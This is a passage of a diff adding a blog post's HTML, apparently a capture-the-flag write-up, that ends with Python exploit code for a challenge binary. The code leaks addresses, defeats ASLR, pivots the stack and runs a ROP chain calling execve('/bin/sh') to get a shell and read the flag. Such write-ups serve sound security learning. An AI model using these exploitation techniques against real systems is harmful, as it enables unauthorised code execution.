+<div class="sourceLine" id="33" href="#33" data-line-number="33">    p.flush()</div>
+<div class="sourceLine" id="34" href="#34" data-line-number="34"></div>
+<div class="sourceLine" id="35" href="#35" data-line-number="35">    output <span class="op">=</span> []</div>
+<div class="sourceLine" id="36" href="#36" data-line-number="36">    <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">8</span>):</div>
+<div class="sourceLine" id="37" href="#37" data-line-number="37">        output.append(p.readuntil(<span class="st">&#39;</span><span class="ch">\n</span><span class="st">&#39;</span>)[:<span class="op">-</span><span class="dv">1</span>])</div>
+<div class="sourceLine" id="38" href="#38" data-line-number="38">    material_readout <span class="op">=</span> output[<span class="op">-</span><span class="dv">2</span>]</div>
+<div class="sourceLine" id="39" href="#39" data-line-number="39">    <span class="cf">assert</span> <span class="st">&#39;ENRICHMENT MATERIAL&#39;</span> <span class="kw">in</span> material_readout</div>
+<div class="sourceLine" id="40" href="#40" data-line-number="40">    material_readout <span class="op">=</span> material_readout.split(<span class="st">&#39;: &#39;</span>, <span class="dv">1</span>)[<span class="dv">1</span>]</div>
+<div class="sourceLine" id="41" href="#41" data-line-number="41">    <span class="cf">return</span> material_readout</div>
+<div class="sourceLine" id="42" href="#42" data-line-number="42"></div>
+<div class="sourceLine" id="43" href="#43" data-line-number="43">write_material(<span class="st">&#39;A&#39;</span> <span class="op">*</span> <span class="bn">0x44</span>)</div>
+<div class="sourceLine" id="44" href="#44" data-line-number="44">material_readout <span class="op">=</span> read_material()</div>
+<div class="sourceLine" id="45" href="#45" data-line-number="45"><span class="cf">assert</span> material_readout[:<span class="bn">0x44</span>] <span class="op">==</span> <span class="st">&#39;A&#39;</span> <span class="op">*</span> <span class="bn">0x44</span></div>
+<div class="sourceLine" id="46" href="#46" data-line-number="46"></div>
+<div class="sourceLine" id="47" href="#47" data-line-number="47"><span class="kw">def</span> base256_to_int(xs):</div>
+<div class="sourceLine" id="48" href="#48" data-line-number="48">    n <span class="op">=</span> <span class="dv">0</span></div>
+<div class="sourceLine" id="49" href="#49" data-line-number="49">    <span class="cf">for</span> x <span class="kw">in</span> <span class="bu">reversed</span>(xs):</div>
+<div class="sourceLine" id="50" href="#50" data-line-number="50">        n <span class="op">=</span> <span class="dv">256</span> <span class="op">*</span> n <span class="op">+</span> x</div>
+<div class="sourceLine" id="51" href="#51" data-line-number="51">    <span class="cf">return</span> n</div>
+<div class="sourceLine" id="52" href="#52" data-line-number="52"></div>
+<div class="sourceLine" id="53" href="#53" data-line-number="53">rpm_alert_addr <span class="op">=</span> material_readout[<span class="bn">0x44</span>:]</div>
+<div class="sourceLine" id="54" href="#54" data-line-number="54"><span class="cf">while</span> <span class="bu">len</span>(rpm_alert_addr) <span class="op">&lt;</span> <span class="dv">8</span>: rpm_alert_addr <span class="op">+=</span> <span class="st">&#39;</span><span class="ch">\0</span><span class="st">&#39;</span></div>
+<div class="sourceLine" id="55" href="#55" data-line-number="55"><span class="bu">print</span>([<span class="bu">ord</span>(c) <span class="cf">for</span> c <span class="kw">in</span> rpm_alert_addr])</div>
+<div class="sourceLine" id="56" href="#56" data-line-number="56"></div>
+<div class="sourceLine" id="57" href="#57" data-line-number="57"><span class="bu">print</span>(base256_to_int([<span class="bu">ord</span>(c) <span class="cf">for</span> c <span class="kw">in</span> rpm_alert_addr]))</div>
+<div class="sourceLine" id="58" href="#58" data-line-number="58"></div>
+<div class="sourceLine" id="59" href="#59" data-line-number="59">write_material(<span class="st">&#39;A&#39;</span> <span class="op">*</span> <span class="bn">0x4C</span>)</div>
+<div class="sourceLine" id="60" href="#60" data-line-number="60">material_readout <span class="op">=</span> read_material()</div>
+<div class="sourceLine" id="61" href="#61" data-line-number="61"><span class="cf">assert</span> material_readout[:<span class="bn">0x4C</span>] <span class="op">==</span> <span class="st">&#39;A&#39;</span> <span class="op">*</span> <span class="bn">0x4C</span></div>
+<div class="sourceLine" id="62" href="#62" data-line-number="62"></div>
+<div class="sourceLine" id="63" href="#63" data-line-number="63">abort_addr <span class="op">=</span> material_readout[<span class="bn">0x4C</span>:]</div>
+<div class="sourceLine" id="64" href="#64" data-line-number="64"><span class="cf">while</span> <span class="bu">len</span>(abort_addr) <span class="op">&lt;</span> <span class="dv">8</span>: abort_addr <span class="op">+=</span> <span class="st">&#39;</span><span class="ch">\0</span><span class="st">&#39;</span></div>
+<div class="sourceLine" id="65" href="#65" data-line-number="65"></div>
+<div class="sourceLine" id="66" href="#66" data-line-number="66"><span class="co"># haxx for null bytes in address, esp. with ASLR off:</span></div>
+<div class="sourceLine" id="67" href="#67" data-line-number="67"><span class="co"># abort_addr = abort_addr[:5] + &#39;\x7f&#39; + &#39;\0\0&#39;</span></div>
+<div class="sourceLine" id="68" href="#68" data-line-number="68"></div>
+<div class="sourceLine" id="69" href="#69" data-line-number="69">current_abort <span class="op">=</span> base256_to_int([<span class="bu">ord</span>(c) <span class="cf">for</span> c <span class="kw">in</span> abort_addr])</div>
+<div class="sourceLine" id="70" href="#70" data-line-number="70">aslr_off_abort <span class="op">=</span> 0x7f000025eec0L</div>
+<div class="sourceLine" id="71" href="#71" data-line-number="71">aslr_offset <span class="op">=</span> current_abort <span class="op">-</span> aslr_off_abort</div>
+<div class="sourceLine" id="72" href="#72" data-line-number="72"></div>
+<div class="sourceLine" id="73" href="#73" data-line-number="73"><span class="co"># given a ROP gadget address from the ROP tab, turn it into an</span></div>
+<div class="sourceLine" id="74" href="#74" data-line-number="74"><span class="co"># actual string of bytes that&#39;s an address</span></div>
+<div class="sourceLine" id="75" href="#75" data-line-number="75"><span class="kw">def</span> aslr_pos(pos):</div>
+<div class="sourceLine" id="76" href="#76" data-line-number="76">    n <span class="op">=</span> <span class="bn">0x7f0000228000</span> <span class="op">+</span> aslr_offset <span class="op">+</span> pos</div>
+<div class="sourceLine" id="77" href="#77" data-line-number="77">    <span class="bu">print</span> <span class="st">&#39;aslr_pos =&#39;</span>, <span class="bu">hex</span>(n)</div>
+<div class="sourceLine" id="78" href="#78" data-line-number="78">    ret <span class="op">=</span> []</div>
+<div class="sourceLine" id="79" href="#79" data-line-number="79">    <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">8</span>):</div>
+<div class="sourceLine" id="80" href="#80" data-line-number="80">        ret.append(<span class="bu">chr</span>(n <span class="op">%</span> <span class="dv">256</span>))</div>
+<div class="sourceLine" id="81" href="#81" data-line-number="81">        n <span class="op">//=</span> <span class="dv">256</span></div>
+<div class="sourceLine" id="82" href="#82" data-line-number="82">    <span class="cf">return</span> <span class="st">&#39;&#39;</span>.join(ret)</div>
+<div class="sourceLine" id="83" href="#83" data-line-number="83"></div>
+<div class="sourceLine" id="84" href="#84" data-line-number="84"><span class="co"># add rsp, 0x38</span></div>
+<div class="sourceLine" id="85" href="#85" data-line-number="85"><span class="co"># puts stack pointer at cmd + 0x10, hopefully.</span></div>
+<div class="sourceLine" id="86" href="#86" data-line-number="86">stack_pivot <span class="op">=</span> aslr_pos(<span class="bn">0xc96a6</span>)</div>
+<div class="sourceLine" id="87" href="#87" data-line-number="87"><span class="bu">print</span> <span class="st">&#39;stack pivot&#39;</span>, <span class="bu">repr</span>(stack_pivot)</div>
+<div class="sourceLine" id="88" href="#88" data-line-number="88"></div>
+<div class="sourceLine" id="89" href="#89" data-line-number="89"><span class="co"># run_firmware(&#39;7&#39; * 100)</span></div>
+<div class="sourceLine" id="90" href="#90" data-line-number="90"></div>
+<div class="sourceLine" id="91" href="#91" data-line-number="91"><span class="kw">def</span> run_and_jump(addr, execute_cmd):</div>
+<div class="sourceLine" id="92" href="#92" data-line-number="92">    run_firmware(<span class="st">&#39;&#39;</span>.join(<span class="st">&#39;2&#39;</span><span class="op">+</span>c <span class="cf">for</span> c <span class="kw">in</span> <span class="st">&#39;A&#39;</span><span class="op">*</span><span class="bn">0x44</span> <span class="op">+</span> addr) <span class="op">+</span> <span class="st">&#39;7&#39;</span> <span class="op">*</span> <span class="dv">100</span>,</div>
+<div class="sourceLine" id="93" href="#93" data-line-number="93">        execute_cmd, last_rd <span class="op">=</span> <span class="va">False</span>)</div>
+<div class="sourceLine" id="94" href="#94" data-line-number="94"></div>
+<div class="sourceLine" id="95" href="#95" data-line-number="95"><span class="bu">print</span>(<span class="st">&quot;wow!&quot;</span>)</div>
+<div class="sourceLine" id="96" href="#96" data-line-number="96"><span class="co"># run_and_jump(abort_addr)</span></div>
+<div class="sourceLine" id="97" href="#97" data-line-number="97">run_and_jump(stack_pivot, <span class="st">&#39;E&#39;</span> <span class="op">*</span> <span class="dv">16</span></div>
+<div class="sourceLine" id="98" href="#98" data-line-number="98">    <span class="op">+</span> aslr_pos(<span class="bn">0x33544</span>) <span class="co"># pop rax ; ret</span></div>
+<div class="sourceLine" id="99" href="#99" data-line-number="99">    <span class="op">+</span> <span class="st">&#39;</span><span class="ch">\x3b\0\0\0\0\0\0\0</span><span class="st">&#39;</span></div>
+<div class="sourceLine" id="100" href="#100" data-line-number="100">    <span class="op">+</span> aslr_pos(<span class="bn">0x21102</span>) <span class="co"># pop rdi ; ret</span></div>
+<div class="sourceLine" id="101" href="#101" data-line-number="101">    <span class="op">+</span> aslr_pos(<span class="bn">0x3b4d57</span> <span class="op">-</span> <span class="bn">0x228000</span>) <span class="co"># &quot;/bin/sh&quot;</span></div>
+<div class="sourceLine" id="102" href="#102" data-line-number="102">    <span class="op">+</span> aslr_pos(<span class="bn">0x1150c9</span>) <span class="co"># pop rdx ; pop rsi ; ret</span></div>
+<div class="sourceLine" id="103" href="#103" data-line-number="103">    <span class="op">+</span> <span class="st">&#39;</span><span class="ch">\0</span><span class="st">&#39;</span><span class="op">*</span><span class="dv">16</span></div>
+<div class="sourceLine" id="104" href="#104" data-line-number="104">    <span class="op">+</span> aslr_pos(<span class="bn">0xbc375</span>) <span class="co"># syscall ; ret</span></div>
+<div class="sourceLine" id="105" href="#105" data-line-number="105">    )</div>
+<div class="sourceLine" id="106" href="#106" data-line-number="106"></div>
+<div class="sourceLine" id="107" href="#107" data-line-number="107">p.sendline(<span class="st">&quot;ls&quot;</span>)</div>
+<div class="sourceLine" id="108" href="#108" data-line-number="108"></div>
+<div class="sourceLine" id="109" href="#109" data-line-number="109">p.interactive()</div></code></pre>
+<p>Running <code>cat flag</code> in our new shell gives us the flag!</p>
+<pre><code>flag{1s_thi5_th3_n3w_stuxn3t_0r_jus7_4_w4r_g4m3}</code></pre></article>
+	<footer class="post-footer">
+		
+		<ul class="post-tags">
+			
+			<li><a href="/tag/ctf"><span class="tag">CTF</span></a></li>
+			
+		</ul>
+		
+	</footer>
+	<script data-isso="//node.vero.site/isso/" data-isso-css="false" src="//node.vero.site/isso/js/embed.min.js"></script>
+	<section id="isso-thread"></section>
+	<p class="comments-meta">(note: the commenting setup here is experimental and I may not check my comments often; if you want to tell <em>me</em> something instead of the world, email me!)</p>
+	
+	
+	
+	<footer class="post-footer">
+		<nav class="pagination">
+			
+			<a class="pagination-previous" href="//blog.vero.site/post/proprietary-format">← Proprietary Format</a>
+			
+			
+		</nav>
+	</footer>
+</section>
+<footer class="site-footer">
+	<p>© 2017-2018 betaveros, Bounded-Error Log</p>
+	<a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/"><img alt="Creative Commons License" style="border-width:0" src="//i.creativecommons.org/l/by-sa/4.0/88x31.png" /></a><br />Except where otherwise noted, content on this site is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License</a>.
+	<p>Powered by <a href="https://gohugo.io/">Hugo</a>, <a href="http://pandoc.org/">pandoc</a>,
+	<a href="https://posativ.org/isso/">Isso</a>,
+	<a href="https://pages.github.com/">GitHub Pages</a>, and
+	<a href="https://www.cloudflare.com/">CloudFlare</a>.
+	</p>
+</footer>
+
+
+<script async src="//cdn.bootcss.com/video.js/6.2.8/alt/video.novtt.min.js"></script>
+
+<script src="/katex/katex.min.js"></script>
+<script src="/katex/contrib/auto-render.min.js"></script>
+<script>renderMathInElement(document.body);</script>
+<script src="/js/bundle.js"></script>
+<script src="/js/jquery-3.2.1.min.js"></script>
+
+
+
+  </div></body>
+</html>
